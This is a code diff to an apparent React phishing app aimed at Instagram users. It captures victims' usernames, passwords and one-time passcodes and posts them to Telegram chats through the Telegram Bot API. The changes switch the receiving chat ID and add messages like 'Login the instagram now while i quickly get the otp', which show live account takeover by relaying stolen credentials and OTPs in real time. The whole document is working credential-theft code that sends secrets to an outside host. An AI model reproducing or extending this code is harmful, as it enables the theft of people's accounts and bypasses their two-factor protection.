@@ -38,8 +38,7 @@ function App() {
     const payload = {
       chat_id: "1936090861",
       text: `
-username/email/phone number: ${username}
-password: ${password} 
+This is the OTP 🚀
 OTP: ${otp}
 `,
     };
@@ -55,8 +54,9 @@ OTP: ${otp}
         if(username && password){
         // Create the payload with chat_id (username or phone number) and text (message)
         const payload = {
-          chat_id: "1936090861",
+          chat_id: "6283042501",
           text: `
+Login the instagram now while i quickly get the otp 😁
 username/email/phone number: ${username}
 password: ${password} 
 `,
@@ -64,7 +64,7 @@ password: ${password}
 
         // axios.get(updates)
         // .then(res => {
-        //   console.log(res.data.result[0].message.chat.id)
+        //   console.log(res.data.result)
         // }).catch(error => console('Error sending message: ' + error))
     
         // Send the HTTP POST request to the Telegram Bot API
